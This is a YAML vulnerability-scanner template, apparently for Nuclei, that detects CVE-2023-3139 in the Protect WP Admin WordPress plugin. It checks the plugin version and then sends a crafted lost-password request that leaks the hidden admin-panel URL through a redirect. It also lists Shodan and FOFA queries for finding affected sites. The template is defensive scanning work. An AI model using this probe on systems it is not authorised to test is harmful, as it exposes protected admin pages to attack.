flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: version
    part: body
    regex:
    - 'Stable tag: ([0-9.]+)'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, 'Protect WP Admin')
    - compare_versions(version, '<= 4.0')
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/protect-wp-admin/readme.txt'
- extractors:
  - group: 1
    internal: true
    name: redirect_url
    part: header
    regex:
    - Location:([ a-z:/0-9.?=&]+)
    type: regex
  - dsl:
    - '"Protected URL:"+ redirect_url'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - status_code == 301
    - contains(location, '?action=lostpassword&error=invalidkey')
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/wp-login.php?action=lostpassword&error=invalidkey'
id: CVE-2023-3139
info:
  author: popcorn94
  classification:
    cpe: cpe:2.3:a:wp-experts:protect_wp_admin:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-3139
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
    epss-percentile: 0.87917
    epss-score: 0.03912
  description: 'The Protect WP Admin WordPress plugin before version 4.0 disclosed
    the URL of the admin panel through the redirection of a crafted URL, bypassing
    the protection offered.

    '
  impact: 'Unauthenticated attackers can exploit URL redirection to discover the protected
    admin panel URL and bypass the protection mechanism offered by the plugin.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/protect-wp-admin/"
    framework: wordpress
    max-request: 1
    product: protect_wp_admin
    publicwww-query: /wp-content/plugins/protect-wp-admin/
    shodan-query: http.html:"/wp-content/plugins/protect-wp-admin"
    vendor: wp-experts
    verified: true
  name: Protect WP Admin < 4.0 - Unauthenticated Protection Bypass
  reference:
  - https://wpscan.com/vulnerability/f8a29aee-19cd-4e62-b829-afc9107f69bd/
  - https://magos-securitas.com/txt/CVE-2023-3139.txt
  remediation: Fixed in 4.0 or later
  severity: medium
  tags: cve,cve2023,wordpress,wp-plugin,protect-wp-admin,unauth,wpscan,vkev,vuln
